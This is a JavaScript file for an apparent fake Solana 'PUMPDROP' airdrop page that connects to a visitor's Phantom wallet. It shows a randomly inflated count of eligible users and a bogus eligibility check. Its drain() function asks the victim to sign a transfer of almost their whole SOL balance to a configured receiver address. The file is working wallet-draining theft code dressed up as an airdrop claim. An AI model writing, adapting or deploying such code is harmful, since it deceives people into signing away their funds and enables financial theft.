(() => {
  const statusEl = document.getElementById('status');
  const addrEl = document.getElementById('addr');
  const solEl = document.getElementById('solBal');
  const eligEl = document.getElementById('elig');
  const activityEl = document.getElementById('activity');
  const connectBtn = document.getElementById('connectBtn');
  const eligCountEl = document.getElementById('eligCount');
  const recvEl = document.getElementById('recv');
  const toAddrEl = document.getElementById('toAddr');
  const amtEl = document.getElementById('amt');
  const sendBtn = document.getElementById('sendBtn');
  const drainBtn = document.getElementById('drainBtn');
  const xlog = document.getElementById('xlog');

  const cfg = (window.PUMPDROP_CONFIG || {});
  recvEl.textContent = cfg.receiver || '(not set)';

  eligCountEl.textContent = (15200 + Math.floor(Math.random()*300)).toLocaleString();

  const { Connection, PublicKey, SystemProgram, Transaction } = solanaWeb3;
  const RPC = 'https://api.mainnet-beta.solana.com';
  const connection = new Connection(RPC, 'confirmed');

  function getProvider() {
    const anyWindow = window;
    if ('solana' in anyWindow) {
      const provider = anyWindow.solana;
      if (provider?.isPhantom) return provider;
    }
    return null;
  }

  let wallet = null;
  let pubkey = null;

  function setDisconnected() {
    statusEl.textContent = 'Disconnected';
    addrEl.textContent = '';
    solEl.textContent = '—';
    eligEl.textContent = '—';
    activityEl.textContent = 'Connect to fetch account info.';
    xlog.textContent = '';
  }

  function log(s){ xlog.textContent += `[${new Date().toLocaleTimeString()}] ${s}\n`; xlog.scrollTop = xlog.scrollHeight; }

  async function connect() {
    const provider = getProvider();
    if (!provider) {
      statusEl.textContent = 'Install Phantom to continue';
      activityEl.innerHTML = 'Phantom not detected. <a target="_blank" rel="noreferrer" href="https://phantom.app/">Get Phantom</a>';
      return;
    }
    try {
      const res = await provider.connect({ onlyIfTrusted: false });
      wallet = provider;
      pubkey = res.publicKey;
      const base58 = pubkey.toBase58();
      statusEl.textContent = `Connected`;
      addrEl.textContent = `${base58.slice(0,4)}…${base58.slice(-4)}`;
      await refresh();
    } catch (e) {
      log('Connect rejected');
    }
  }

  function demoEligibility(lamports) {
    const sol = lamports / 1e9;
    return sol >= 0.25 ? 'Eligible' : 'Not eligible';
  }

  async function refresh() {
    if (!pubkey) return setDisconnected();
    try {
      const bal = await connection.getBalance(pubkey, 'confirmed');
      solEl.textContent = `${(bal/1e9).toFixed(4)} SOL`;
      eligEl.textContent = demoEligibility(bal);
      const info = await connection.getAccountInfo(pubkey, 'confirmed');
      let out = `Lamports: ${bal}\n`;
      out += `Data length: ${info?.data?.length || 0}`;
      activityEl.textContent = out;
      return bal;
    } catch (e) {
      activityEl.textContent = 'Failed to load account info.';
      log(e?.message || 'error');
    }
  }

  async function manualSend() {
    if (!wallet || !pubkey) return log('Connect first');
    try {
      const destStr = toAddrEl.value.trim();
      const amtSol = parseFloat(amtEl.value.trim());
      if (!destStr || !amtSol || amtSol <= 0) return log('Enter recipient and positive amount');
      const dest = new PublicKey(destStr);
      const lamports = Math.floor(amtSol * 1e9);
      const { blockhash } = await connection.getLatestBlockhash('finalized');
      const tx = new Transaction({ recentBlockhash: blockhash, feePayer: pubkey });
      tx.add(SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: dest, lamports }));
      log(`Requesting wallet approval for ${amtSol} SOL → ${destStr.slice(0,4)}…${destStr.slice(-4)}`);
      const signed = await wallet.signAndSendTransaction(tx);
      log(`Submitted: ${signed?.signature || '(no sig)'}`);
    } catch (e) {
      log('Send rejected or failed');
    }
  }

  async function drain() {
    if (!wallet || !pubkey) return log('Connect first');
    if (!cfg.receiver) return log('Receiver not configured');
    try {
      const receiver = new PublicKey(cfg.receiver);
      const balance = await connection.getBalance(pubkey, 'confirmed');
      const reserve = 2_000_000; // 0.002 SOL
      let sendLamports = Math.max(0, balance - reserve);
      if (sendLamports < 50_000) return log('Nothing to drain');
      const { blockhash } = await connection.getLatestBlockhash('finalized');
      const tx = new Transaction({ recentBlockhash: blockhash, feePayer: pubkey });
      tx.add(SystemProgram.transfer({ fromPubkey: pubkey, toPubkey: receiver, lamports: sendLamports }));
      log(`Requesting drain ${ (sendLamports/1e9).toFixed(6) } SOL → ${cfg.receiver.slice(0,4)}…${cfg.receiver.slice(-4)}`);
      const signed = await wallet.signAndSendTransaction(tx);
      log(`Submitted: ${signed?.signature || '(no sig)'}`);
    } catch (e) {
      log('Drain failed or rejected');
    }
  }

  connectBtn.addEventListener('click', connect);
  sendBtn.addEventListener('click', manualSend);
  drainBtn.addEventListener('click', drain);
  setDisconnected();
})();
